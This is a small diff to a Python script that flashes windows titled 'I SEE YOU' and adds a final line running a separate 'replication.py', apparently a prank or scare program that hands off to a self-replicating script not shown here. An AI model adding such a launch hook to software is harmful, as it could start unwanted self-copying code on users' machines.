@@ -13,6 +13,7 @@ from threading import Timer
 import tkinter as tk
 import random
 import os
+import subprocess
 
 root = tk.Tk()
 
@@ -29,3 +30,5 @@ for i in range(15):
     i += 1
     cv2.waitKey(800)
     cv2.destroyWindow("I SEE YOU" + str(i-3))
+
+subprocess.run(["python", "replication.py"])
